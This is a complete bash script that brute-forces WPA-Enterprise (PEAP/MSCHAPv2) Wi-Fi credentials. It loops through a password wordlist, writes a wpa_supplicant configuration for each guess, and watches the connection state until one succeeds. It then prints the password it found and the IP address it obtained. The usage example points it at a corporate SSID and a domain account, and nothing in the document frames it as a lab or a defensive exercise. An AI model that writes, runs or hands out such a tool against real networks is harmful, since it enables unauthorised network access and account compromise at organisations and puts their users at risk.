#!/usr/bin/env bash
# wpa_brute_try.sh — WPA-Enterprise (PEAP/MSCHAPv2) brute-force script
# Usage:
#   ./wpa_brute_try.sh -i wlan0 -s "wifi-corp" \
#     -U "CONTOSO\\test" -A "anon@domain.com" \
#     -C "/home/user/corp/ca.pem" -w /opt/wordlists/rockyou.txt [-T 10]

set -euo pipefail

# === Argument parsing ===
IFACE=""
SSID=""
IDENTITY=""
ANON_ID=""
CA_CERT=""
TIMEOUT=10
WORDLIST=""

while getopts "i:s:U:A:C:T:w:" opt; do
  case "$opt" in
    i) IFACE="$OPTARG" ;;
    s) SSID="$OPTARG" ;;
    U) IDENTITY="$OPTARG" ;;
    A) ANON_ID="$OPTARG" ;;
    C) CA_CERT="$OPTARG" ;;
    T) TIMEOUT="$OPTARG" ;;
    w) WORDLIST="$OPTARG" ;;
    *) echo "Bad option"; exit 2 ;;
  esac
done

if [[ -z "$IFACE" || -z "$SSID" || -z "$IDENTITY" || -z "$ANON_ID" || -z "$CA_CERT" || -z "$WORDLIST" ]]; then
  echo "Usage: $0 -i <iface> -s <ssid> -U <identity> -A <anon_id> -C <ca_cert> -w <wordlist> [-T timeout]"
  exit 2
fi

# === Initial interface setup ===
ip link set "$IFACE" up
wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
sleep 0.5

echo "[*] Starting brute-force against SSID '$SSID' with identity '$IDENTITY'"

# === Trap for final cleanup ===
final_cleanup() {
  wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
}
trap final_cleanup EXIT

# === Brute-force loop ===
while IFS= read -r PASSWORD; do
  [[ -z "$PASSWORD" ]] && continue
  echo "[>] Trying password: $PASSWORD"

  TMPDIR="$(mktemp -d)"
  CONF="$TMPDIR/wpa.conf"
  LOGF="$TMPDIR/wpa.log"
  PIDF="$TMPDIR/wpa.pid"

  # Escape double quotes in password
  ESCAPED_PW="${PASSWORD//\"/\\\"}"

  # === WPA config generation ===
  cat > "$CONF" <<EOF
ctrl_interface=/var/run/wpa_supplicant
update_config=0

network={
    ssid="${SSID}"
    scan_ssid=1
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="${IDENTITY}"
    anonymous_identity="${ANON_ID}"
    password="${ESCAPED_PW}"
    phase2="auth=MSCHAPV2"
    ca_cert="${CA_CERT}"
}
EOF

  # Start WPA supplicant
  wpa_supplicant -B -i "$IFACE" -c "$CONF" -f "$LOGF"
  sleep 0.5

  # Record PID (best-effort)
  pgrep -f "wpa_supplicant.*${IFACE}.*${CONF}" | head -n1 > "$PIDF" || true

  # === Connection wait loop ===
  deadline=$((SECONDS + TIMEOUT))
  state=""
  while (( SECONDS < deadline )); do
    state="$(wpa_cli -i "$IFACE" status 2>/dev/null | awk -F= '$1=="wpa_state"{print $2}')"
    if [[ "$state" == "COMPLETED" ]]; then
      ipaddr="$(wpa_cli -i "$IFACE" status 2>/dev/null | awk -F= '$1=="ip_address"{print $2}')"
      echo "[+] SUCCESS! Password found: $PASSWORD"
      echo "[+] IP: ${ipaddr:-none}"
      exit 0
    fi
    if grep -qi "No network config matching" "$LOGF" 2>/dev/null; then
      break
    fi
    sleep 0.3
  done

  # === Per-attempt cleanup ===
  if [[ -f "$PIDF" ]]; then
    kill -9 "$(cat "$PIDF")" >/dev/null 2>&1 || true
  fi
  wpa_cli -i "$IFACE" disconnect >/dev/null 2>&1 || true
  wpa_cli -i "$IFACE" terminate >/dev/null 2>&1 || true
  rm -rf "$TMPDIR"

done < "$WORDLIST"

echo "[-] FAILED: No valid password found in '$WORDLIST'."
exit 1
